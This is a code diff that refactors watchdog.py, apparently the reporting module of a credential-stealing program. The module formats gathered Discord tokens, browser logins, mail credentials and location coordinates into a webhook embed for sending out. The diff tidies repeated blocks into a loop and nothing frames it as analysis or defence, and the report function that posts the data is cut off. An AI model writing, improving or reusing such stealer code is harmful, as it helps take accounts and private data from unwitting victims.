@@ -1,5 +1,4 @@
-# watchdog.py — owns the webhook and posts the gathered data.
-# main.py calls report(data) after netinit.gather().
+# watchdog.py — owns the webhook, posts what netinit gathered.
 
 import json
 import urllib.request
@@ -40,37 +39,21 @@ def _build_embed(d):
         {"name": "Coords", "value": str(d.get("coords", "?")), "inline": False},
     ]
 
-    tokens = d.get("tokens", [])
-    if tokens:
-        fields.append({
-            "name": f"Discord Tokens ({len(tokens)})",
-            "value": "```\n" + "\n".join(tokens)[:1000] + "\n```",
-            "inline": False,
-        })
+    for label, key in (
+        ("Discord Tokens", "tokens"),
+        ("Browser Logins", "logins"),
+        ("Mail Creds",     "mails"),
+    ):
+        items = d.get(key, [])
+        if items:
+            body = "\n".join(items)[:1000]
+            fields.append({
+                "name": f"{label} ({len(items)})",
+                "value": f"```\n{body}\n```",
+                "inline": False,
+            })
 
-    logins = d.get("logins", [])
-    if logins:
-        fields.append({
-            "name": f"Browser Logins ({len(logins)})",
-            "value": "```\n" + "\n".join(logins)[:1000] + "\n```",
-            "inline": False,
-        })
-
-    mails = d.get("mails", [])
-    if mails:
-        fields.append({
-            "name": f"Mail Creds ({len(mails)})",
-            "value": "```\n" + "\n".join(mails)[:1000] + "\n```",
-            "inline": False,
-        })
-
-    return {
-        "embeds": [{
-            "title": "device",
-            "color": 0x2B2B2B,
-            "fields": fields,
-        }]
-    }
+    return {"embeds": [{"title": "device", "color": 0x2B2B2B, "fields": fields}]}
 
 
 def report(data):
